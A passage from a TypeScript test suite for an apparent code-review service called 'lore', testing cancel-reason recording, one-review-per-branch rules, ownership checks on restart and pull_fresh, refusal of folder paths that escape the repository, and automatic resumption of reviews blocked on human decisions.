      path: undefined, cwe: undefined, provenance: undefined, sourceBlob: undefined, confidence: undefined,
    }).id;
    const b = store.addKnowledge({
      repoId, kind: "rule", source: "taught", statement: "holds never expire", why: undefined,
      path: undefined, cwe: undefined, provenance: undefined, sourceBlob: undefined, confidence: undefined,
    }).id;
    // No recordConflict call — these two ids have no open conflict between them.

    const out = await callRaw("knowledge_escalate", { left: a, right: b, note: "cannot decide" });
    expect(out.result?.isError).toBe(true);
    expect(message(out)).toMatch(/no OPEN conflict/);
  });

  it("still records a real escalation (control)", async () => {
    const a = store.addKnowledge({
      repoId, kind: "rule", source: "taught", statement: "holds expire", why: undefined,
      path: undefined, cwe: undefined, provenance: undefined, sourceBlob: undefined, confidence: undefined,
    }).id;
    const b = store.addKnowledge({
      repoId, kind: "rule", source: "taught", statement: "holds never expire", why: undefined,
      path: undefined, cwe: undefined, provenance: undefined, sourceBlob: undefined, confidence: undefined,
    }).id;
    store.recordConflict(repoId, a as string, b as string);

    const out = await callTool("knowledge_escalate", { left: a, right: b, note: "cannot decide" });
    expect(out["escalated"]).toBe(true);
  });
});

// THE TOOL PROMISED THE REASON WAS "RECORDED, AND THE ONLY ACCOUNT ANYONE GETS", and it
// was recorded nowhere. It went into the reply and was dropped, so two reviews a real
// client cancelled on 2026-08-07 read as `cancelled` with no account at all — whatever
// it said about why is gone. A false statement in an interface text, in the one field
// whose entire purpose is to survive the call.
describe("a cancelled review keeps the reason it was cancelled for", () => {
  const started = (id: string) => {
    store.createReview({
      id, repoId, principal: "alice", branch: "feat/z", intoRef: "main",
      ticket: "t", type: "code-arch", state: "running", ladder: initialState(),
    });
  };

  it("records it, and hands it back on a later poll", async () => {
    started("revC");
    await callTool("review_cancel", { review_id: "revC", reason: "the branch was rebased under it" });

    const out = await callTool("review_poll", { review_id: "revC" });
    expect(out["state"]).toBe("cancelled");
    expect(String(out["failed_because"])).toContain("the branch was rebased under it");
    // Who stopped it, not only why: a cancel is somebody's decision.
    expect(String(out["failed_because"])).toContain("alice");
  });

  // A cancel with no reason is honest about having none, rather than inventing one.
  it("says plainly when nobody gave a reason", async () => {
    started("revD");
    await callTool("review_cancel", { review_id: "revD" });
    const out = await callTool("review_poll", { review_id: "revD" });
    expect(String(out["failed_because"])).toMatch(/no reason recorded/);
  });

  // AND IT MAY NOT BORROW ONE FROM A ROUND THAT THREW. `failureReason` falls back to the
  // most recent `job.last_error`, which is right for `failed` — that error usually IS the
  // truest account — and a fabrication for `cancelled`, where somebody made a decision.
  // The first version of this fix inherited the fallback silently, and the test written
  // beside it cancelled a review with no jobs at all, so the path was never exercised:
  // a transport error from an unrelated earlier round would have been handed back as the
  // person's stated reason, in the field the tool calls "the only account anyone gets".
  it("never reports a round's error as the reason a person stopped it", async () => {
    started("revE");
    store.enqueue("revE", "fast");
    const job = store.db.prepare("SELECT id FROM job WHERE review_id = 'revE'").get() as { id: number };
    store.finishJob(job.id, "failed", "socket hang up talking to the provider");

    await callTool("review_cancel", { review_id: "revE" });
    const out = await callTool("review_poll", { review_id: "revE" });
    expect(String(out["failed_because"])).not.toContain("socket hang up");
    expect(String(out["failed_because"])).toMatch(/no reason recorded/);
  });

  // de431bb7, found by lore's own review: forClient exists to translate SYSTEM
  // vocabulary (opencode, provider names, filesystem paths) out of what a client
  // sees, but a cancelled review's reason is always the CLIENT'S OWN free text —
  // and forClient ran over it anyway. Its URL-stripping rule deleted a link the
  // client wrote on purpose; its path-rewrite rule turned "at /srv/repos/rigid"
  // into words the client never wrote, in the field TOOL_DOCS.cancel calls "the
  // only account anyone gets".
  it("does not run a client's own cancel reason through the operator-vocabulary translator", async () => {
    started("revF");
    await callTool("review_cancel", {
      review_id: "revF",
      reason: "superseded by https://github.com/org/repo/pull/42, mirror was broken at /srv/repos/rigid",
    });

    const out = await callTool("review_poll", { review_id: "revF" });
    expect(String(out["failed_because"]), "the client's own URL must survive").toContain(
      "https://github.com/org/repo/pull/42",
    );
    expect(String(out["failed_because"]), "the client's own path must survive, not be rewritten").toContain(
      "/srv/repos/rigid",
    );
  });

  // 0796e115, found by lore's own review against its own de431bb7 fix just above:
  // that fix skipped forClient whenever the review's CURRENT state is cancelled —
  // but a held diff that fails to apply writes RAW kitchen text (an absolute
  // worktree path, raw git plumbing) while the review is awaiting_diff, non-
  // terminal (consumeHeldDiffs / worker.ts's late-hold sweep). A reasonless cancel
  // from there never overwrites the stored text (review_cancel only writes when a
  // reason is given), so it survives unchanged into cancelled, and the state-keyed
  // check let it through raw — lore's own disk layout, to a client.
  it("still translates a stale system reason that survives into cancelled with no reason given", async () => {
    started("revG");
    store.setFailureReason(
      "revG",
      "held diff 7 did not apply: git apply --check failed in /var/lib/lore/repos/abc-123/wt/rev_X: error: patch failed",
    );
    store.updateReview("revG", { state: "awaiting_diff" });

    await callTool("review_cancel", { review_id: "revG" });

    const out = await callTool("review_poll", { review_id: "revG" });
    expect(out["state"]).toBe("cancelled");
    expect(String(out["failed_because"]), "lore's own disk path must not reach the client").not.toContain(
      "/var/lib/lore",
    );
    expect(String(out["failed_because"]), "must read as translated, not merely stripped").toContain(
      "in the review's copy of your branch",
    );
  });
});

// Found by lore's own review (5e6c18de): three texts told a client a cancelled
// review's findings were "still available from review_poll" — but review_cancel
// marks every finding delivered at the SAME handover that hands them back, so
// review_poll's own `new_findings` is empty for a cancelled review, always. Only
// `lore://review/{id}` — which returns the whole history, not a delta — still has
// them.
describe("a cancelled review's findings are not where the text used to say (5e6c18de)", () => {
  const started = (id: string) => {
    store.createReview({
      id, repoId, principal: "alice", branch: "feat/w", intoRef: "main",
      ticket: "t", type: "code-arch", state: "running", ladder: initialState(),
    });
  };

  it("returns no new findings on a poll after cancel, and says so rather than 'listed here'", async () => {
    started("revF");
    store.recordFinding("revF", {
      fingerprint: "fp1", file: "src/x.ts", line: 1, symbol: "s", severity: "high",
      claim: "c", evidence: "e", failureScenario: "s", cwe: undefined,
      origin: "t1", round: 1, firstSeen: new Date().toISOString(),
    });
    await callTool("review_cancel", { review_id: "revF" });

    const out = await callTool("review_poll", { review_id: "revF" });
    expect(out["new_findings"], "everything was already handed over at cancel").toStrictEqual([]);
    expect(String(out["note"]), "must not claim the findings are in THIS response").not.toMatch(/listed here/);
    // 1ee794a4/e54c900e, found by lore's own review: this string used to end in a
    // literal, never-substituted "{review_id}" — real braces, not a template
    // interpolation, because nextStep had no id to fill it with. A client
    // following the instruction verbatim would resources/read a URI that does not
    // exist. The real id must appear; the placeholder must not.
    expect(String(out["note"]), "the REAL review id, ready to use as-is").toContain("lore://review/revF");
    expect(String(out["note"]), "must not leave an unsubstituted placeholder").not.toContain("{review_id}");
  });

  it("points a repeat cancel at the resource for a review's findings, not review_poll", async () => {
    started("revG");
    await callTool("review_cancel", { review_id: "revG" });

    const res = await mcp(
      { jsonrpc: "2.0", id: 1, method: "tools/call", params: { name: "review_cancel", arguments: { review_id: "revG" } } },
      token,
    );
    const line = (await res.text()).split("\n").find((l) => l.startsWith("data:")) ?? "";
    const rpc = JSON.parse(line.slice("data:".length)) as { result?: { content?: { text?: string }[]; isError?: boolean } };
    const message = rpc.result?.content?.[0]?.text ?? "";
    expect(rpc.result?.isError).toBe(true);
    expect(message).toContain("lore://review/revG");
    // May still MENTION review_poll to say don't use it — must not claim findings
    // are AVAILABLE FROM it, the false shape the original text had.
    expect(message, "must not claim the findings are available FROM review_poll").not.toMatch(
      /available from review_poll/,
    );
  });
});

// Six reviews of one branch in two hours, four of another, and 13 of 30 reviews
// stopping at round 1 — measured on the first day a real client drove this.
//
// The ladder only reaches its deep, independent tiers by ADVANCING: findings carry
// forward, ratified justifications stay ratified, severity escalates where an answer
// did not hold. A restart discards all of it and re-pays t0 and t1. So the repository
// under review all day produced ZERO verdicts and learned nothing, which for a
// service whose product is accumulated memory is the whole failure.
describe("one review per branch", () => {
  /** The error path, which `callTool` cannot reach — it asserts there is no error. */
  const callRaw = async (name: string, args: Record<string, unknown>, bearer: string = token) => {
    const res = await mcp({ jsonrpc: "2.0", id: 1, method: "tools/call", params: { name, arguments: args } }, bearer);
    const line = (await res.text()).split("\n").find((l) => l.startsWith("data:")) ?? "";
    return JSON.parse(line.slice("data:".length)) as {
      result?: { content?: { text?: string }[]; isError?: boolean };
      error?: { message?: string };
    };
  };
  const message = (r: Awaited<ReturnType<typeof callRaw>>) =>
    `${r.error?.message ?? ""} ${r.result?.content?.[0]?.text ?? ""}`;

  const start = (args: Record<string, unknown> = {}) =>
    callRaw("review_start", { branch: "feat/x", into: "main", ticket: "do the thing", ...args });

  it("refuses a second review of a branch that already has one open, and names it", async () => {
    const first = await start();
    const id = JSON.parse(first.result?.content?.[0]?.text ?? "{}").review_id as string;
    expect(id).toMatch(/^rev_/);

    const second = await start();
    // Refused, not silently satisfied: returning the FIRST review's id from a call
    // that asked for a new one is the quiet substitution this project refuses.
    expect(second.result?.isError).toBe(true);
    expect(message(second)).toContain(id);
    expect(message(second)).toContain("review_submit");
    // And no NEW review was created behind the refusal.
    const { c } = store.db.prepare("SELECT COUNT(*) c FROM review WHERE branch = 'feat/x'").get() as { c: number };
    expect(c).toBe(1);
  });

  // Found by lore's own review (5e53c948): the refusal above unconditionally told the
  // caller to "poll it, then answer with review_submit" — both bound to the token
  // that STARTED the review (D-78, `TOOL_DOCS.inbox`'s own disclosure: "a
  // review_poll on one of those ids still answers NOT FOUND"). A second, still-live
  // token of the SAME principal — the ordinary shape of a rotation's overlap window
  // — hits this exact dedup refusal (same repo, same branch) and then has no legal
  // way to act on the id it was just handed, since poll/submit both answer "not
  // found" for it too. pull_fresh is repo-scoped, not token-scoped, so it must be
  // offered unconditionally here, not only "if you pushed more commits".
  it("tells a caller on a rotated token that pull_fresh works even if poll/submit answer not found", async () => {
    await start();
    const rotated = grantToken(store, repoId, "alice");

    const second = await callRaw("review_start", { branch: "feat/x", into: "main", ticket: "do the thing" }, rotated);
    expect(second.result?.isError).toBe(true);
    expect(message(second)).toMatch(/not found/);
    expect(message(second)).toContain("pull_fresh");
    expect(message(second), "must not condition pull_fresh on having pushed commits").not.toMatch(
      /if you pushed more commits, call review_start with pull_fresh/,
    );
  });

  // Found by lore's own review (393cf295), against the fix just above — this is
  // EXACTLY the case 5e53c948 named ("regardless of whether you pushed anything")
  // and got wrong: nothing was pushed, so origin has not moved, so pull_fresh's own
  // "unchanged" reply (server.ts, a few lines above this refusal) would re-pin
  // nothing and hand back "push your commits, then call again" — to a caller who has
  // none. The message must not oversell pull_fresh as the one action that always
  // works, and must name the mechanism that actually does: revoking the stale token
  // (CLI-only, `mine`'s own comment) falls the binding back to repository scope.
  it("does not oversell pull_fresh when nothing has been pushed, and names the actual way out", async () => {
    await start();
    const rotated = grantToken(store, repoId, "alice");

    const second = await callRaw("review_start", { branch: "feat/x", into: "main", ticket: "do the thing" }, rotated);
    expect(second.result?.isError).toBe(true);
    expect(
      message(second),
      "pull_fresh does nothing when origin has not moved — must not claim otherwise",
    ).not.toMatch(/works regardless of whether you pushed anything/);
    expect(message(second), "the reliable fallback — revoking the stale token — must be named").toMatch(/revoke/);
    expect(message(second)).toContain("make revoke");
  });

  // A rebase or force-push genuinely invalidates the pinned snapshot, so there has to
  // be a way through — an explicit one, never a default.
  /**
   * PULL_FRESH CONTINUES; IT NEVER CREATES (D-108). The client models kept answering
   * findings by restarting — abandoning everything a review had learned to avoid
   * composing a diff — so the middle path re-pins the SAME review to origin's new tip.
   * These are the three refusals that keep it honest; the recut itself is repin.test.ts.
   */
  describe("pull_fresh", () => {
    it("refuses to be combined with restart, naming the contradiction", async () => {
      await start();
      const out = await start({ restart: true, pull_fresh: true });
      expect(out.result?.isError).toBe(true);
      expect(message(out)).toContain("contradict");
    });

    it("refuses when there is nothing to continue", async () => {
      const out = await start({ pull_fresh: true });
      expect(out.result?.isError).toBe(true);
      expect(message(out)).toContain("has none");
    });

    it("waits out a running round rather than re-pinning under a reading tier", async () => {
      const first = await start();
      const id = JSON.parse(first.result?.content?.[0]?.text ?? "{}").review_id as string;
      store.enqueue(id, "fast");

      const out = await start({ pull_fresh: true });
      expect(out.result?.isError).toBe(true);
      expect(message(out)).toContain("when it parks");
      // The throw is before any mutation, so the review keeps the exact state the
      // fixture created it in — "queued" from review_start itself.
      expect(store.getReview(id, "alice")?.state).toBe("queued");
    });

    // aa8cc149, found by lore's own review: the SAME gap restart had (8d847ca4), one
    // branch over. `deps.repin` is not wired in this fixture at all, so before this
    // fix a colleague's pull_fresh on someone else's review fell through to "this
    // build cannot re-pin a review" — never refusing on OWNERSHIP, only on
    // capability. On a real deployment that same call would reach repin and recut
    // the worktree, discarding any fix the owner had submitted but not committed.
    // The ownership check must fire before capability is even asked about.
    it("refuses to pull_fresh a colleague's open review, naming its owner, not a capability gap", async () => {
      const first = await start();
      const firstId = JSON.parse(first.result?.content?.[0]?.text ?? "{}").review_id as string;

      const bob = grantToken(store, repoId, "bob");
      const out = await callRaw(
        "review_start",
        { branch: "feat/x", into: "main", ticket: "do the thing", pull_fresh: true },
        bob,
      );

      expect(out.result?.isError).toBe(true);
      expect(message(out), "name the review and its owner").toContain(firstId);
      expect(message(out)).toContain("alice");
      expect(message(out), "must refuse on OWNERSHIP, not fall through to a capability error").not.toMatch(
        /cannot re-pin/,
      );
      expect(store.getReview(firstId, "alice")?.state, "the colleague's review must survive untouched").toBe(
        "queued",
      );
    });
  });

  it("allows a restart when asked for deliberately", async () => {
    const first = await start();
    const firstId = JSON.parse(first.result?.content?.[0]?.text ?? "{}").review_id as string;

    const again = await start({ restart: true });
    const secondId = JSON.parse(again.result?.content?.[0]?.text ?? "{}").review_id as string;
    expect(secondId).toMatch(/^rev_/);
    expect(secondId).not.toBe(firstId);
  });

  /**
   * AND A RESTART CANCELS WHAT IT REPLACES. It used to fall straight through to
   * createReview and touch nothing, so the old review stayed OPEN: two live reviews of
   * one branch racing rounds against two pinned trees. Measured before fixing:
   * feat/RIGID-129 accumulated SEVEN overlapping generations this way, each restart
   * stacking a new live review on the last, until the operator mass-cancelled them by
   * hand from the board.
   */
  it("cancels the review it is restarting, so one branch has one live review", async () => {
    const first = await start();
    const firstId = JSON.parse(first.result?.content?.[0]?.text ?? "{}").review_id as string;

    await start({ restart: true });

    expect(store.getReview(firstId, "alice")?.state, "the predecessor ends as somebody-decided").toBe("cancelled");
    const open = store.db
      .prepare("SELECT COUNT(*) c FROM review WHERE branch = 'feat/x' AND state NOT IN ('passed','passed_partial','failed','expired','cancelled')")
      .get() as { c: number };
    expect(open.c, "exactly one live review per branch").toBe(1);
    // The account of WHY survives on the old review, as for any cancel.
    expect(String(store.failureReason(firstId, false) ?? "")).toContain("superseded by a restart");
  });

  // 8d847ca4, found by lore's own review: `open` is repo-scoped so any colleague can
  // see a branch already has a review — that is deliberate, to stop duplicate work.
  // Before this fix, restart: true acted on that same repo-scoped lookup with no
  // ownership check, so a colleague's restart cancelled someone else's review: every
  // justification it had ratified, any model call in flight, gone with no warning.
  // review_cancel has always refused this via mine(); restart fell through it.
  it("refuses to restart a colleague's open review, and leaves it untouched", async () => {
    const first = await start();
    const firstId = JSON.parse(first.result?.content?.[0]?.text ?? "{}").review_id as string;

    const bob = grantToken(store, repoId, "bob");
    const out = await callRaw(
      "review_start",
      { branch: "feat/x", into: "main", ticket: "do the thing", restart: true },
      bob,
    );

    expect(out.result?.isError).toBe(true);
    expect(message(out), "name the review and its owner").toContain(firstId);
    expect(message(out)).toContain("alice");
    expect(message(out), "must refuse outright, not start a second live review").toContain("NOTHING WAS STARTED");
    expect(store.getReview(firstId, "alice")?.state, "the colleague's review must survive untouched").toBe("queued");
  });

  // Found by lore's own review of D-130, HIGH severity: making `into` optional (at
  // the schema level, to allow folder mode) made a request missing it reach the
  // handler for the first time ever — before, `into: z.string().min(1)` refused it
  // before any code ran. A late "into is required" check, sitting after this exact
  // restart-cancel block, would destroy the predecessor and THEN refuse — the precise
  // incident the block above's own comment documents fixing, reopened by this change.
  it("refuses a restart with no into BEFORE cancelling the predecessor, not after", async () => {
    const first = await start();
    const firstId = JSON.parse(first.result?.content?.[0]?.text ?? "{}").review_id as string;

    const out = await start({ restart: true, into: undefined });
    expect(out.result?.isError, "refused for the missing into").toBe(true);
    expect(message(out)).toContain("into");

    // The predecessor must be exactly as it was — not cancelled by a restart that
    // was itself refused.
    expect(store.getReview(firstId, "alice")?.state, "not destroyed by a refused restart").toBe("queued");
    const failure = store.failureReason(firstId, false);
    expect(failure, "no cancellation was recorded either").toBeUndefined();
  });

  it("lets a finished branch be reviewed again without ceremony", async () => {
    const first = await start();
    const id = JSON.parse(first.result?.content?.[0]?.text ?? "{}").review_id as string;
    store.updateReview(id, { state: "passed" });

    const next = await start();
    expect(JSON.parse(next.result?.content?.[0]?.text ?? "{}").review_id).toMatch(/^rev_/);
  });

  it("does not confuse one branch's open review with another's", async () => {
    await start();
    const other = await start({ branch: "feat/y" });
    expect(JSON.parse(other.result?.content?.[0]?.text ?? "{}").review_id).toMatch(/^rev_/);
  });
});

/**
 * A REVIEW WITH NO BASE (D-130). `mode: "folder"` and `path` replace `into` for a
 * full read of a path rather than a diff — these are the refusals that keep the two
 * shapes from being sent contradictory instructions, and the one path that proves a
 * folder review actually gets written the way the rest of the system expects to read it.
 */
describe("folder mode", () => {
  const callRaw = async (name: string, args: Record<string, unknown>) => {
    const res = await mcp({ jsonrpc: "2.0", id: 1, method: "tools/call", params: { name, arguments: args } }, token);
    const line = (await res.text()).split("\n").find((l) => l.startsWith("data:")) ?? "";
    return JSON.parse(line.slice("data:".length)) as {
      result?: { content?: { text?: string }[]; isError?: boolean };
      error?: { message?: string };
    };
  };
  const message = (r: Awaited<ReturnType<typeof callRaw>>) =>
    `${r.error?.message ?? ""} ${r.result?.content?.[0]?.text ?? ""}`;

  // No default `into` here — most of this block is specifically about when it may
  // and may not be present.
  const start = (args: Record<string, unknown>) => callRaw("review_start", { branch: "feat/x", ticket: "t", ...args });

  it("refuses folder mode with no path, rather than defaulting to the repo root", async () => {
    const out = await start({ mode: "folder" });
    expect(out.result?.isError).toBe(true);
    expect(message(out)).toContain("path");
  });

  it("refuses folder mode combined with into, naming the contradiction", async () => {
    const out = await start({ mode: "folder", path: ".", into: "main" });
    expect(out.result?.isError).toBe(true);
    expect(message(out)).toContain("contradict");
  });

  it("refuses path without folder mode", async () => {
    const out = await start({ into: "main", path: "src" });
    expect(out.result?.isError).toBe(true);
    expect(message(out)).toContain("folder");
  });

  it("refuses ordinary (diff) mode with no into, same as always", async () => {
    const out = await start({});
    expect(out.result?.isError).toBe(true);
    expect(message(out)).toContain("into");
  });

  it("starts a folder review, recorded with a path and no into", async () => {
    const out = await start({ mode: "folder", path: "src/payments" });
    expect(out.result?.isError).toBeUndefined();
    const id = JSON.parse(out.result?.content?.[0]?.text ?? "{}").review_id as string;
    expect(id).toMatch(/^rev_/);

    const row = store.db.prepare("SELECT into_ref, review_path FROM review WHERE id = ?").get(id) as {
      into_ref: string;
      review_path: string | null;
    };
    expect(row.review_path).toBe("src/payments");
    expect(row.into_ref, "the write-side sentinel forced by into_ref's NOT NULL").toBe("");
  });

  // The dedup key is (branch, path) (D-130), not branch alone — a folder review must
  // not be refused as a duplicate of an ordinary diff review on the same branch, or
  // vice versa.
  it("does not treat a folder review as a duplicate of a diff review on the same branch", async () => {
    const diffReview = await start({ branch: "feat/shared", into: "main" });
    expect(diffReview.result?.isError).toBeUndefined();

    const folderReview = await start({ branch: "feat/shared", mode: "folder", path: "." });
    expect(folderReview.result?.isError, message(folderReview)).toBeUndefined();
  });

  // Found by lore's own review of D-130: "src", "src/" and "./src" name the same
  // scope to git, but a byte-exact dedup key would have let each spelling open its
  // own review of the identical directory — the exact duplication one-review-per-
  // (branch, path) exists to prevent, just reachable through a spelling instead of
  // a second call.
  it("treats equivalent spellings of one path as the same review, not three", async () => {
    const first = await start({ branch: "feat/spellings", mode: "folder", path: "src" });
    expect(first.result?.isError, message(first)).toBeUndefined();
    const id = JSON.parse(first.result?.content?.[0]?.text ?? "{}").review_id as string;

    for (const spelling of ["src/", "./src"]) {
      const again = await start({ branch: "feat/spellings", mode: "folder", path: spelling });
      expect(again.result?.isError, `path: "${spelling}" should collide with the first review`).toBe(true);
      expect(message(again)).toContain(id);
    }

    const row = store.db.prepare("SELECT review_path FROM review WHERE id = ?").get(id) as { review_path: string };
    expect(row.review_path, "stored in one canonical spelling").toBe("src");
  });

  // Found by lore's own review of D-130, matching the precedent `into` already set:
  // an unrefused path escaping the worktree reaches wholeTreeDiff's git call and
  // fails with raw git vocabulary about a directory nobody watching this service
  // can see, instead of a door refusal naming the actual problem.
  //
  // "/" is here on its own: found by lore's own review a SECOND time, because the
  // first fix checked absoluteness on the NORMALIZED path — and normalizeReviewPath("/")
  // is "." (posix.normalize("/") is "/", the trailing-slash strip then empties it),
  // a harmless-looking relative path that silently passed the door and reviewed the
  // whole repository instead of refusing the absolute path actually sent.
  it.each([["../shared"], ["/home/agent/repo/src"], [".."], ["/"]])(
    "refuses a path that escapes the worktree: %s",
    async (path) => {
      const out = await start({ mode: "folder", path });
      expect(out.result?.isError, message(out)).toBe(true);
      expect(message(out)).toContain("inside the repository");
    },
  );

  it("still accepts an ordinary relative path", async () => {
    const out = await start({ branch: "feat/relative", mode: "folder", path: "src/payments" });
    expect(out.result?.isError, message(out)).toBeUndefined();
  });

  // Found by lore's own review of D-130: a NUL byte in `path` throws from Node's own
  // `execFile` when wholeTreeDiff finally uses it, not from git — by which point the
  // review row already exists and a slot is already spent. Refused at the door instead.
  it("refuses a path containing a NUL byte", async () => {
    const out = await start({ mode: "folder", path: "src\0junk" });
    expect(out.result?.isError, message(out)).toBe(true);
    expect(message(out)).toContain("NUL");
  });
});

/**
 * WHAT THE MONEY MAY DO, WHICH IS THE ONLY MONEY DECISION LEFT (D-117, D-121).
 *
 * `/status` used to publish `spend_ceiling`, and publishing it taught an operator that a
 * dollar figure bounded the day. None does: `spendToday` is a reading and nothing branches
 * on it. What CAN be refused is a route that bills per call, so that is what is reported —
 * and it is reported in both states, because a key that vanishes in the safe case teaches
 * a monitor to ignore its absence.
 */
describe("status says whether an outage will cost money or coverage", () => {
  it("reports the metered-route decision", async () => {
    const body = (await (await fetch(`${base}/status`)).json()) as Record<string, unknown>;
    expect(body["allow_metered"], "present, and false is the default").toBe(false);
  });

  // The number is still there and still means what it says. Reporting is the whole of
  // what lore does with a price now.
  it("still reports what was spent, and acts on none of it", async () => {
    store.recordUsage({ tier: "t1", costUsd: 0.42, outcome: "ok" });

    const body = (await (await fetch(`${base}/status`)).json()) as Record<string, unknown>;
    expect(body["spendToday"]).toBeCloseTo(0.42, 6);
    expect(body, "no ceiling is published, because none exists").not.toHaveProperty("spend_ceiling");
    expect(body["ok"], "and a spend does not make the service unhealthy").toBe(true);
  });
});

// `needs_human` is the one state whose entire purpose is "a person must decide this",
// and it shipped saying only that. A client hit it on a real review and reported,
// correctly, that lore "does not say which question". Telling an agent to stop and ask
// a human without telling it what to ask is the same defect as a review that did not
// run reporting nothing found: the machine knows what the caller needs and withholds it.
describe("needs_human says what the question is", () => {
  const conflicted = () => {
    store.createReview({
      id: "revH", repoId, principal: "alice", branch: "feat/x", intoRef: "main",
      ticket: "t", type: "code-arch", state: "needs_human", ladder: initialState(),
    });
    const a = store.addKnowledge({
      repoId, kind: "rule", source: "ingested", statement: "Holds must expire after seven days",
      why: undefined, path: undefined, cwe: undefined, provenance: "docs/adr/0022.md",
      sourceBlob: undefined, confidence: undefined,
    });
    const b = store.addKnowledge({
      repoId, kind: "rule", source: "ingested", statement: "Holds must never expire",
      why: undefined, path: undefined, cwe: undefined, provenance: "docs/adr/0030.md",
      sourceBlob: undefined, confidence: undefined,
    });
    store.recordConflict(repoId, a.id, b.id);
  };

  it("returns both statements, not just an id pair", async () => {
    conflicted();
    const out = await callTool("review_poll", { review_id: "revH" });

    expect(out["state"]).toBe("needs_human");
    const qs = out["open_questions"] as { left: { statement: string }; right: { statement: string } }[];
    expect(qs).toHaveLength(1);
    // The statements ARE the question. An id pair sends the reader on a second
    // lookup for the only thing that matters.
    expect(qs[0]?.left.statement).toContain("expire after seven days");
    expect(qs[0]?.right.statement).toContain("never expire");
    // And where each came from, so a person can go and read the source.
    expect(JSON.stringify(qs[0])).toContain("docs/adr/0030.md");
  });

  it("says why a review cannot settle it, and what to call instead", async () => {
    conflicted();
    const out = await callTool("review_poll", { review_id: "revH" });
    expect(String(out["needs_human_because"])).toMatch(/A REVIEW CANNOT SETTLE THIS/);
    expect(String(out["needs_human_because"])).toContain("knowledge_resolve");
  });

  // Resolution is the normal exit from needs_human. Told "the record is gone, report
  // a defect", a client would file a bug because a person did what they were asked.
  //
  // lore-ok[de741489]: found real by lore's own review — this called
  // `store.resolveConflict` directly (not `decide()`/`knowledge_resolve`), exactly
  // the shape a document edit retiring one side of a conflict takes (D-20) — so
  // `resumeNeedsHuman` was never called, matching the real gap this test exists to
  // guard: a review closed this way used to be told to "call review_submit" (which
  // the schema refuses for an empty diff) and still say `state: "needs_human"`
  // afterward. It must now come back ALREADY resumed, from the poll itself.
  it("resumes the review itself once the conflict is resolved, rather than telling the client to submit", async () => {
    conflicted();
    const c = store.openConflicts(repoId)[0];
    store.resolveConflict(repoId, c?.left ?? "", c?.right ?? "", "a person chose");

    const out = await callTool("review_poll", { review_id: "revH" });
    expect(out["state"], "the review must come back queued, not still needs_human").toBe("queued");
    expect(String(out["needs_human_because"])).toMatch(/ANSWERED/);
    expect(String(out["needs_human_because"])).toMatch(/resumed automatically/);
    expect(String(out["needs_human_because"])).not.toMatch(/defect in lore/);
    expect(out["open_questions"]).toStrictEqual([]);
    expect(store.getReview("revH", "alice")?.state, "the DB row itself must have moved, not just this reply").toBe(
      "queued",
    );
  });

  // Found by lore's own review (9e18a0b1, afc10ea2, two tiers on the same defect) —
  // the resume above corrects `state`/`clean`/`note` but `pacing` and the subscribeTo
  // gate read `review.state`, the stale pre-resume value, straight off `mine`'s
  // result. A just-resumed poll said `state: "queued"` with its `note` instructing
  // "read `check_back_note` THIS TIME" while `check_back_note` itself was absent —
  // `pacing` gated on the stale `needs_human` and returned `{}`. A reply telling a
  // client to do something the same reply makes impossible.
  it("carries check_back_note along with the resumed state, not the stale needs_human gate", async () => {
    conflicted();
    const c = store.openConflicts(repoId)[0];
    store.resolveConflict(repoId, c?.left ?? "", c?.right ?? "", "a person chose");

    const out = await callTool("review_poll", { review_id: "revH" });
    expect(out["state"]).toBe("queued");
    expect(String(out["note"]), "fixture sanity: the note must actually reference the field this checks").toMatch(
      /check_back_note/,
    );
    expect(out, "the note points at a field pacing must actually include for the corrected state").toHaveProperty(
      "check_back_note",
    );
  });

  it("says nothing about questions on a review that has none", async () => {
    store.createReview({
      id: "revQ", repoId, principal: "alice", branch: "feat/y", intoRef: "main",
      ticket: "t", type: "code-arch", state: "findings_ready", ladder: initialState(),
    });
    const out = await callTool("review_poll", { review_id: "revQ" });
    expect(out).not.toHaveProperty("open_questions");
  });

  // The realistic trigger for de741489: nobody called knowledge_resolve at all. An
  // ORDINARY document edit re-ingested one side's document with different text,
  // which retires the rule via D-20's re-derive path — a route recordConflict's own
  // fix (592cd49f) already made openConflicts() stop counting, but that fix never
  // added a resume call to the retirement path, only to knowledge_resolve's.
  it("resumes a review whose blocking conflict closed via a document re-ingest, not knowledge_resolve", async () => {
    store.createReview({
      id: "revD", repoId, principal: "alice", branch: "feat/z", intoRef: "main",
      ticket: "t", type: "code-arch", state: "needs_human", ladder: initialState(),
    });
    const a = store.addKnowledge({
      repoId, kind: "rule", source: "ingested", statement: "Holds must expire after seven days",
      why: undefined, path: undefined, cwe: undefined, provenance: "docs/adr/0022.md",
      sourceBlob: "blob-v1", confidence: undefined,
    });
    const b = store.addKnowledge({
      repoId, kind: "rule", source: "ingested", statement: "Holds must never expire",
      why: undefined, path: undefined, cwe: undefined, provenance: "docs/adr/0030.md",
      sourceBlob: undefined, confidence: undefined,
    });
    store.recordConflict(repoId, a.id, b.id);

    // The document behind rule `a` changed — an ordinary re-ingest, nobody deciding
    // anything about the conflict.
    store.retireForChangedBlob(repoId, "docs/adr/0022.md", "blob-v2", "3");
    expect(store.openConflicts(repoId), "fixture sanity: the conflict must actually be closed").toHaveLength(0);

    const out = await callTool("review_poll", { review_id: "revD" });
    expect(out["state"]).toBe("queued");
    expect(String(out["needs_human_because"])).toMatch(/resumed automatically/);
  });
});

// review_inbox HAD ITS OWN COPY OF THE SAME OLD TEXT.
//
// de741489 taught review_poll to auto-resume, but review_inbox is where a client
// looks FIRST (its own comment says so), and it kept "call review_submit on it (an
// empty diff is fine)" — a call review_submit's own schema refuses (absent() maps ""
// to undefined, and the exactly-one-of refine rejects both undefined). A client that
// only ever calls the inbox, never polling the parked review directly, had no route
// to the fix at all.
//
// lore-ok[c8d63c13]: fixed in review_inbox's own handler, mirroring review_poll's
// resume-before-responding shape.
describe("review_inbox resumes a needs_human review too, not only review_poll (c8d63c13)", () => {
  it("comes back queued from the inbox once the blocking conflict is resolved, with no impossible instruction", async () => {
    store.createReview({
      id: "revI", repoId, principal: "alice", branch: "feat/inbox", intoRef: "main",
      ticket: "t", type: "code-arch", state: "needs_human", ladder: initialState(),
    });
    const a = store.addKnowledge({
      repoId, kind: "rule", source: "ingested", statement: "Holds must expire after seven days",
      why: undefined, path: undefined, cwe: undefined, provenance: "docs/adr/0022.md",
      sourceBlob: undefined, confidence: undefined,
    });
    const b = store.addKnowledge({
      repoId, kind: "rule", source: "ingested", statement: "Holds must never expire",
      why: undefined, path: undefined, cwe: undefined, provenance: "docs/adr/0030.md",
      sourceBlob: undefined, confidence: undefined,
    });
    store.recordConflict(repoId, a.id, b.id);
